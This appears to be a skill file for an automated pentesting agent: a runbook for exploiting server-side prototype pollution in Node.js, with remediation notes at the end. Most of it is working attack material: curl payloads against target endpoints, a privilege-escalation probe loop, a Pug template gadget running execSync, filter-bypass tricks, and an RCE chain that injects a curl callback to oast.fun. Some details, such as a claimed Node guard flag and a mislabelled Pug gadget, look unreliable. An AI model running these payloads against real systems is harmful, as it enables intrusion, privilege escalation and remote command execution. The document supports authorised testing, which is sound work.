---
name: prototype-pollution
description: Server-side prototype pollution in Node.js (lodash / merge / Object.assign loops) leading to property gadget RCE
triggers: [prototype pollution, __proto__, constructor.prototype, lodash merge, deep-assign, deep extend, polluted]
---

# Server-Side Prototype Pollution

When a Node.js app deep-merges user-controlled JSON into a server-side object, attackers who supply `{"__proto__": {"polluted": "x"}}` write to `Object.prototype` itself. Every object in the process now has a `polluted` property. Downstream code that does `if (config.isAdmin)` reads from the polluted prototype — even when `config` was never set explicitly. The classic chain is pollution → property gadget → RCE.

CWE-1321; A04:2021 + A08:2021. Companion to `scan_prototype_pollution`.

## Attack Surface

**Vulnerable libraries (canonical CVEs)**
- `lodash.merge` < 4.17.20 (CVE-2018-16487, CVE-2019-10744)
- `lodash.set` < 4.17.20
- `lodash.defaultsDeep`
- `jquery.extend(true, ...)` (server-side rendering contexts)
- `hoek.merge` / `hoek.applyToDefaults` < 4.2.1 (CVE-2018-3728)
- `merge-deep` < 3.0.3 (CVE-2018-16469)
- `deeps` / `deep-extend` < 0.5.1 (CVE-2018-3750)
- `mixin-deep` < 1.3.2 (CVE-2019-10746)
- Hand-rolled recursive `Object.assign` loops without `__proto__` guard

**Where the pollution enters**
- Express `body-parser` with `extended: true` (default) — `qs` parser supports nested objects from query strings: `?__proto__[isAdmin]=true`
- JSON body endpoints that deep-merge into config / session / template-data objects
- WebSocket message handlers that merge `event.data` into application state
- Plugin / middleware loaders that merge user-supplied options
- ORM "fill-by-mass-assignment" patterns

**Where the polluted prop is read (the gadget)**
- Template rendering: pollute `outputFunctionName` (Pug pre-3.0) → SSTI → RCE
- Logging libraries: pollute `prototype.toString` or `prototype.stack` → log-message construction triggers a function call
- `child_process.spawn` shell flag: pollute `prototype.shell` → next `spawn` runs in shell mode → command injection
- `Object.keys` iteration: any `for (k in obj)` enumerates polluted props
- HTML escapers: pollute `prototype.escapeHTML` → bypass output encoding → stored XSS in SSR contexts

## Detection Channels

### Static pollution probe

Submit one of these and check whether a global state change occurred:

```bash
# JSON body
curl -X POST 'https://<TARGET>/api/config' \
  -H 'Content-Type: application/json' \
  -d '{"__proto__": {"polluted": "strix"}}'

# Query string (with qs parser)
curl 'https://<TARGET>/api/search?__proto__[polluted]=strix'

# Constructor variant (some libs filter `__proto__` but not `constructor.prototype`)
curl -X POST 'https://<TARGET>/api/config' \
  -d '{"constructor": {"prototype": {"polluted": "strix"}}}'
```

### Confirm pollution via subsequent request

The pollution is *global to the process*. Any subsequent request that creates a new plain object should see the polluted property:

```bash
# Endpoint that echoes a default-config object
curl 'https://<TARGET>/api/default-config'
# Response should NOT contain "polluted":"strix" — if it does, pollution succeeded.

# Or: any endpoint that does `if (req.body.someProp === undefined) req.body.someProp = 'default'`
# — after pollution, that branch is skipped, observable as different response shape.
```

### Gadget probes (escalation)

```bash
# Pollute `shell` then call any endpoint that spawns a subprocess
curl -X POST 'https://<TARGET>/api/import' \
  -H 'Content-Type: application/json' \
  -d '{"__proto__": {"shell": "/bin/sh"}}'
# Then trigger a subprocess call:
curl -X POST 'https://<TARGET>/api/generate-report' -d '{"format": "pdf"}'
# If the backend uses child_process.spawn without explicit shell:false, polluted shell flag activates command injection.
```

```bash
# Pollute Pug's outputFunctionName (older versions) → SSTI
curl -X POST 'https://<TARGET>/api/save' \
  -d '{"__proto__": {"block": {"type": "Text", "line": "process.mainModule.require(\"child_process\").execSync(\"id\")"}}}'
# Next template render evaluates the injected code.
```

## Operational Runbook

### Step 1 — fingerprint Node version + library versions

```bash
# Pull /package.json or /node_modules listings if exposed
curl -s 'https://<TARGET>/package.json' | jq '.dependencies'

# Or hit a versioned health endpoint
curl -s 'https://<TARGET>/health' | jq '.runtime'

# Look for vulnerable versions of lodash, merge-deep, hoek, etc.
```

### Step 2 — pollution probe

```bash
# Try a battery of pollution shapes
for body in \
    '{"__proto__":{"isAdmin":true}}' \
    '{"constructor":{"prototype":{"isAdmin":true}}}' \
    '{"__proto__.isAdmin":true}' \
    '{"__proto__":{"toString":"polluted"}}'; do
  echo "Probing: $body"
  curl -s -X POST 'https://<TARGET>/api/<merge-endpoint>' \
    -H 'Content-Type: application/json' \
    -d "$body"
  # Check whether a follow-up GET reflects the polluted prop
  curl -s 'https://<TARGET>/api/whoami' | jq '.isAdmin'
done
```

### Step 3 — find the gadget

For each polluted property, find a downstream code path that reads it. Common gadgets:

| Polluted property | Trigger | Impact |
|---|---|---|
| `shell` | `child_process.spawn` / `exec` | RCE |
| `cwd` | `child_process.spawn` | working-dir override |
| `env` | `child_process.spawn` | env-var injection |
| `argv0` | `child_process.spawn` | command-line override |
| `headers` | HTTP request via Node's `http` module | injection |
| `path` | `require()` / fs operations | LFI / RCE |
| `isAdmin` / `role` / `permissions` | Any RBAC check | privilege escalation |
| `script-src` / `outputFunctionName` | Template engines | SSTI |
| `__defineGetter__` / `__defineSetter__` | Object access | DoS / behaviour change |

### Step 4 — RCE chain

```bash
# Pollute shell + trigger subprocess
curl -X POST 'https://<TARGET>/api/upload' \
  -d '{"__proto__":{"shell":"/bin/sh","argv0":"sh -c","env":{"PATH":"/usr/bin"}}}'

# Trigger subprocess via known endpoint (PDF gen, ffmpeg conversion, etc.)
curl -X POST 'https://<TARGET>/api/convert' -d '{"file":"; curl http://oast.fun/pp-rce; #"}'
```

### Step 5 — confirm + scope

After RCE confirmation:
- Note that pollution **persists** across requests until the Node process restarts.
- Document the pollution + gadget + RCE as a single chain.
- Recommend the fix at the *merge* boundary, not the gadget — gadgets are everywhere.

## Bypass Techniques

- **`__proto__` filtered, `constructor.prototype` allowed**: lodash 4.17.11–4.17.15 fixed `__proto__` but not the constructor path.
- **JSON.parse with reviver**: pollution can occur inside the reviver function even when the merge step is safe.
- **`Object.create(null)` doesn't protect**: pollution targets `Object.prototype` itself; null-proto objects only escape pollution *reads*, not pollution *writes*.
- **Query-string-only filters**: many WAFs strip `__proto__` from JSON but not from `qs`-parsed strings.

## Validation

1. Confirm pollution persists across the request boundary (e.g., subsequent unrelated request sees the polluted prop).
2. For RCE-class evidence, show benign command output captured via OAST exfil.
3. For privilege-escalation evidence, show admin-shaped response to a normally-low-priv endpoint.
4. Document: vulnerable library + version, pollution payload, gadget, downstream effect.

## False Positives

- **Server runs with `--no-prototype-pollution-guard` mitigations** — Node 20+ flag prevents `__proto__` writes globally. Pollution attempt silently no-ops.
- **Per-request `Object.create(null)`** in a hot path — that single object escapes pollution-read, but global pollution still occurred. Test on a *different* code path.
- **CDN sanitiser stripping `__proto__`** — confirm by checking whether the body reaches the origin unchanged (Burp's intruder + repeater on origin IP).

## Impact

- Privilege escalation (most common): pollute `isAdmin`, `role`, `permissions`, `featureFlags` → unauthorized access.
- RCE via shell/spawn gadgets when the app uses `child_process` without explicit options.
- Persistent denial of service: pollute `toString` / Symbol.iterator → cascading exceptions across the process.
- SSR XSS: pollute the HTML-escape function → stored XSS even with output encoding active.

## Remediation

1. Upgrade vulnerable libraries: lodash ≥ 4.17.21, hoek ≥ 5, deep-extend ≥ 0.5.1, merge-deep ≥ 3.0.3.
2. Use a JSON-schema validator at every input boundary (`ajv`, `joi`, `zod`) — reject objects with `__proto__` / `constructor` keys.
3. Replace `Object.assign` / `lodash.merge` patterns with explicit field-by-field copies for trust-boundary merges.
4. Use `Object.create(null)` as the base for ALL config objects that mirror user input.
5. Add Node CLI flag: `--disable-proto=delete` (Node 12+) — removes `__proto__` from the prototype chain entirely.
6. Run `gh-prototype-pollution-detector` / `eslint-plugin-no-prototype-builtins` in CI.

## Pro Tips

1. The fastest pollution probe is `?__proto__[strix]=1` on any GET endpoint behind Express+qs. Then GET any unrelated endpoint and check whether the response body has a `strix` key on otherwise-plain objects.
2. JSON body endpoints with `Content-Type: application/json` use a different code path than form bodies — test both.
3. Look at the **import graph** for vulnerable libraries (`npm ls lodash` against the production lockfile). Even if the app doesn't call `merge` directly, a transitive dep might.
4. Pollution is **cross-tenant** in a multi-tenant Node app — one tenant's pollution affects all other tenants' requests.
5. Once you find pollution, search for the gadgets via the codebase: `child_process.spawn(`, `child_process.exec(`, `template.render(`, `for (... in ...)`.

## Summary

Server-side prototype pollution converts a deep-merge into global state corruption. Fix at the merge boundary by schema-validating input and upgrading vulnerable libraries — chasing gadgets one by one is a losing game.
